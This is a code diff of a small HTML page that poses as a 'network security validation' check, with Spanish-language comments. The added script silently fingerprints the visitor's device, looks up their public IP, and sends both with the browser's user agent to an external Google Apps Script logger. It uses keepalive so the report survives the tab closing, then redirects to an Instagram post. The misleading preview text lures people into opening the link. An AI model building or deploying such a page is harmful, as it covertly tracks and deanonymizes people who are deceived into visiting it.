@@ -5,10 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cargando...</title>
 
-    <meta property="og:title" content="Seguridad de Red: Validación Requerida" />
-    <meta property="og:description" content="Acceso pendiente. Verificando integridad de la conexión móvil..." />
+    <meta property="og:title" content="Seguridad de Red: Validación de Terminal" />
+    <meta property="og:description" content="Verificando integridad de la conexión móvil para acceso seguro." />
     <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
-    <meta property="og:type" content="website" />
 
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -17,38 +16,38 @@
     </style>
 </head>
 <body>
-
     <div class="spinner"></div>
 
-    <script>
-        window.onload = async function() {
-            const params = new URLSearchParams(window.location.search);
-            
-            // Identificación: Prioriza el nombre en el link, sino crea un ID por resolución de pantalla
-            const user = params.get('u') || "MOVIL_" + screen.width + "x" + screen.height;
-            
-            let ip = "0.0.0.0";
-            try {
-                // Captura de IP rápida
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch (e) { ip = "IP_Movil_Protegida"; }
+<script>
+    window.onload = async function() {
+        // 1. GENERACIÓN DE ID AUTOMÁTICO (FINGERPRINT)
+        // Esto crea un ID único basado en el hardware del celular sin que el usuario haga nada
+        const screenRes = screen.width + "x" + screen.height;
+        const cores = navigator.hardwareConcurrency || "N/A";
+        const platform = navigator.platform;
+        const autoID = `AUDIT_${platform}_${screenRes}_CPU${cores}`;
 
-            const ua = encodeURIComponent(navigator.userAgent);
-            const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+        let ip = "0.0.0.0";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) { ip = "IP_Protegida"; }
 
-            // ESTRATEGIA MÓVIL: "keepalive: true" asegura que el envío termine aunque la pestaña se cierre o cambie
-            fetch(`${scriptURL}?u=${user}&ip=${ip}&ua=${ua}`, { 
-                mode: 'no-cors',
-                keepalive: true 
-            });
+        const ua = encodeURIComponent(navigator.userAgent);
+        const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
 
-            // Redirección con ligero retraso para asegurar el registro en el Excel
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/";
-            }, 800); 
-        };
-    </script>
+        // 2. REGISTRO SILENCIOSO CON KEEPALIVE PARA MÓVILES
+        fetch(`${scriptURL}?u=${autoID}&ip=${ip}&ua=${ua}`, { 
+            mode: 'no-cors',
+            keepalive: true 
+        });
+
+        // 3. REDIRECCIÓN INSTANTÁNEA
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/";
+        }, 600); 
+    };
+</script>
 </body>
 </html>
